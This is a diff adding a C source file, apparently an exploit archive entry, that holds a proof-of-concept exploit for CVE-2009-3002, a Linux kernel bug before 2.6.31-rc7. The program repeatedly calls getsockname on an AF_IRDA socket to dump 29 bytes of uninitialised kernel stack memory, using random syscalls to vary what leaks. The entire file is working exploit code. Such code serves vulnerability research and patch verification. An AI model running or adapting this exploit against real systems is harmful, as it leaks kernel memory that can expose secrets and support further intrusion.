@@ -1,0 +1,118 @@
+/* 
+ * cve-2009-3002.c
+ *
+ * Linux Kernel < 2.6.31-rc7 AF_IRDA getsockname 29-Byte Stack Disclosure
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ * 
+ *   http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-3002 
+ *
+ *   The Linux kernel before 2.6.31-rc7 does not initialize certain data 
+ *   structures within getname functions, which allows local users to read 
+ *   the contents of some kernel memory locations by calling getsockname 
+ *   on ... (2) an AF_IRDA socket, related to the irda_getname function in 
+ *   net/irda/af_irda.c.
+ *
+ * Notes:
+ * 
+ *   Yet another stack disclosure...although this one is big and contiguous.
+ */
+
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <errno.h>
+#include <unistd.h>
+#include <time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+
+#ifndef AF_IRDA
+#define AF_IRDA 23
+#endif
+
+struct sockaddr_irda {
+	uint16_t sir_family;
+	uint8_t sir_lsap_sel;
+	uint32_t sir_addr;
+	char sir_name[25];
+};
+
+const int randcalls[] = {
+	__NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
+	__NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl,
+	__NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup,
+	__NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl,
+	__NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday,
+	__NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
+	__NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid,
+	__NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority,
+	__NR_sched_getparam, __NR_sched_get_priority_max
+};
+
+void
+dump(const unsigned char *p, unsigned l)
+{
+	printf("sockaddr_irda:");
+	while (l > 0) {
+		printf(" ");
+		if (l == 33 || l == 28) {
+			printf("<<< ");
+		}
+		printf("%02x", *p);
+		if (l == 33 || l == 1) {
+			printf(" >>>");
+		}
+		++p; --l;
+	}
+	printf("\n");
+}
+
+int
+main(void)
+{
+	struct sockaddr_irda saddr;
+	int ret, call, sock, len = sizeof(saddr);
+
+	printf("[+] Creating AF_IRDA socket.\n");
+
+	sock = socket(AF_IRDA, SOCK_DGRAM, 0);
+	if (sock == -1) {
+		printf("[-] Error: Couldn't create AF_IRDA socket.\n");
+		printf("[-] %s.\n", strerror(errno));
+		exit(1);
+	}
+
+	memset(&saddr, 0, len);
+
+	printf("[+] Ready to call getsockname.\n\n");
+
+	for (ret = 5; ret > 0; ret--) {
+		printf("%d...\n", ret);
+		sleep(1);
+	}
+	srand(time(NULL));
+
+	while (1) {
+		/* random stuff to make stack pseudo-interesting */
+		call = rand() % (sizeof(randcalls) / sizeof(int));
+		syscall(randcalls[call]);
+
+		ret = getsockname(sock, (struct sockaddr *) &saddr, &len);
+		if (ret != 0) {
+			printf("[-] Error: getsockname failed.\n");
+			printf("[-] %s.\n", strerror(errno));
+			exit(1);
+		}
+
+		dump((unsigned char *) &saddr, sizeof(saddr));
+	}
+
+	return 0;
+}
+
+// milw0rm.com [2009-08-31]
